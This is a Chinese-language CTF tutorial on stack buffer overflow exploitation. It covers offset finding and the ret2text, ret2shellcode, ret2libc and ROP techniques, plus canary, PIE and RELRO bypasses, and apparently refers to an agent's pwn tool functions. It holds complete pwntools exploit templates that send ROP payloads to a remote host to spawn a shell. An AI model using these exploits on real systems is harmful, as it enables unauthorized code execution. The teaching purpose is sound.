# 栈溢出漏洞

## 描述
当程序向栈上缓冲区写入的数据长度超过其容量，多余数据会覆盖相邻的栈内存，包括保存的返回地址、保存的寄存器、Canary 等。攻击者通过覆盖返回地址，劫持函数返回时的控制流，跳转到任意地址执行代码。

## 触发条件
- 程序使用不安全的函数：`gets`、`scanf("%s")`、`strcpy`、`sprintf`、`memcpy`。
- `read(0, buf, n)` 中 `n` 大于 `buf` 的实际大小。
- checksec 显示对应保护（NX/Canary/PIE）的状态决定利用方式。

## 栈结构与溢出原理
函数调用时栈布局（从高地址到低地址，64 位为例）：
```
高地址
+----------------+
| 函数参数(64位在寄存器) |
+----------------+
| 返回地址 (ret addr) |  <- 目标：覆盖此处
+----------------+
| 保存的 rbp       |  <- rbp 指向这里
+----------------+
| Canary (若开启) |
+----------------+
| 局部变量 buf[?] |
+----------------+  <- rsp 指向这里
低地址
```
- 写入 `buf` 时，数据向高地址方向增长，依次覆盖 Canary、rbp、返回地址。
- `ret` 指令从栈顶弹出返回地址跳转，控制返回地址即控制执行流。

## 检测方法（定位偏移）

### 方法1：pattern 定位（推荐）
1. 调用 `pwn_pattern_create(length=200)` 生成 cyclic pattern。
2. 将 pattern 作为输入发送给程序，触发崩溃。
3. 程序崩溃时 RIP/RSP 寄存器值即为被覆盖的返回地址。
4. 调用 `pwn_pattern_offset(value="0x6161616a")` 计算偏移量。
5. 偏移量 = 填充长度，紧随其后放置目标地址。

### 方法2：手动计算
- 反汇编查看 `buf` 距离 `rbp` 的偏移：`lea rax, [rbp-0x20]` 表示 buf 距 rbp 0x20 字节。
- 偏移 = 距 rbp 偏移 + 8（rbp 本身 8 字节）。

### 方法3：GDB 调试
- `pattern create 200` 生成，`r` 运行，崩溃后 `pattern offset $rsp`。

## 利用方式

### 1. ret2text（无 PIE，无 NX 时也可）
- **条件**：程序无 PIE，`.text` 段地址固定，存在 `system` 或后门函数。
- **步骤**：
  1. `pwn_checksec` 确认 `pie=False`。
  2. `pwn_disassemble` 反汇编，找到 `system`、`backdoor` 函数地址。
  3. `pwn_search_string` 搜索 `/bin/sh` 字符串地址。
  4. 构造 payload：`padding + ret_addr`。
- **64 位调用 system("/bin/sh")**：需用 `pop rdi; ret` gadget 设置 rdi 参数：
  ```
  padding + [pop_rdi_ret] + [/bin/sh_addr] + [system_addr]
  ```
- **32 位**：参数在栈上：`padding + [system_addr] + [fake_ret] + [/bin/sh_addr]`。

### 2. ret2shellcode（NX 关闭）
- **条件**：NX 关闭（`elf.nx=False`），栈/堆可执行，存在可写的缓冲区且能泄漏其地址。
- **步骤**：
  1. `pwn_checksec` 确认 NX 关闭。
  2. 程序将输入读到 `bss`/`栈` 上的 buf，并打印 buf 地址（或用格式化字符串泄漏）。
  3. `pwn_shellcode_generate(arch="amd64", shellcode_type="sh")` 生成 shellcode。
  4. 构造 payload：`shellcode + padding + [buf_addr]`（shellcode 放在 buf 开头）。
- **注意**：若 buf 距返回地址较远，padding 须补齐到偏移量。

### 3. ret2libc（NX 开启，最常见）
- **条件**：NX 开启，程序动态链接 libc，存在 `puts`/`printf`/`write` 可泄漏 libc 地址。
- **核心思路**：两阶段攻击——先泄漏 libc 函数地址计算 libc 基址，再二次触发调用 `system("/bin/sh")`。
- **步骤**：
  1. **泄漏 libc 地址**：用 ROP 调用 `puts(got['puts'])` 打印 puts 实际地址，再 `ret main` 重新触发漏洞。
     ```
     padding + [pop_rdi_ret] + [got_puts] + [plt_puts] + [main_addr]
     ```
  2. **计算 libc 基址**：`libc_base = leaked_puts - libc.symbols['puts']`。
  3. **构造二次 payload**：
     ```
     padding + [pop_rdi_ret] + [binsh_addr] + [system_addr]
     ```
     其中 `binsh_addr = libc_base + next(libc.search(b'/bin/sh'))`，`system_addr = libc_base + libc.symbols['system']`。
- **32 位**：`padding + [plt_puts] + [main] + [got_puts]`。
- **libc 版本确认**：用泄漏的地址末 3 位查 libc-database，或 `LibcSearcher('puts', leaked_puts)`。

### 4. ROP 链构造（通用）
- **条件**：NX 开启，无可用 `system`，需构造更复杂调用（如 `execve("/bin/sh", 0, 0)`）。
- **工具**：`pwn_rop_gadgets` 查找 gadgets，`pwn_rop_chain` 自动构造。
- **常用 gadgets**：
  - `pop rdi; ret` —— 设置第一个参数
  - `pop rsi; ret` —— 设置第二个参数
  - `pop rdx; ret` —— 设置第三个参数
  - `ret` —— 用于栈对齐（16 字节对齐要求）
- **栈对齐问题**：64 位 Ubuntu 18.04+ 的 `system` 要求 16 字节对齐，若调用 `system` 时 SIGSEGV，在 `system` 前加一个 `ret` gadget 对齐。
- **手动构造 execve**：
  ```
  padding + [pop_rdi] + [/bin/sh] + [pop_rsi] + [0] + [pop_rdx] + [0] + [execve_addr]
  ```
- **自动构造**：调用 `pwn_rop_chain(binary_path, func_name="system", args="'/bin/sh'")`。

## 常用 Payload 模板

### ret2text（64 位，无 PIE）
```python
from pwn import *
io = remote('host', port)
elf = ELF('./pwn')
pop_rdi = 0x4011c3  # pop rdi; ret
binsh = next(elf.search(b'/bin/sh'))
system = elf.symbols['system']
ret = 0x401016  # ret (对齐用)
payload = b'A'*0x28 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
```

### ret2libc（64 位，两阶段）
```python
from pwn import *
io = remote('host', port)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
pop_rdi = 0x4011c3
ret = 0x401016
# 阶段1：泄漏 puts 实际地址
payload1 = b'A'*0x28 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
io.sendline(payload1)
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
# 阶段2：调用 system("/bin/sh")
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
payload2 = b'A'*0x28 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload2)
io.interactive()
```

## 绕过技巧
- **Canary 绕过**：
  - 格式化字符串泄漏 Canary（Canary 末字节为 `\x00`，泄漏后需还原）。
  - fork 爆破 Canary（子进程不重新随机化，逐字节爆破，32 位约 1024 次）。
- **PIE 绕过**：先泄漏程序内任意地址（如 `puts` 输出未换行的栈上残留），计算基址 = 泄漏值 - 已知偏移。
- **Full RELRO 绕过**：无法覆写 GOT，改用 `__malloc_hook`/`__free_hook`（glibc < 2.34）或 `_IO_FILE` 相关攻击。
- **截断处理**：64 位地址含 `\x00`，将地址放在 payload 末尾避免截断；或用 partial overwrite 只覆盖低位。

## 注意
- 偏移计算务必准确，可用 GDB 验证 payload 到达返回地址。
- 64 位 `system` 调用注意栈对齐，加 `ret` gadget 修复。
- libc 版本不匹配会导致地址计算错误，泄漏后务必核对。
- 本地用 `process()` 调试时，`libc.path` 与远程可能不同。
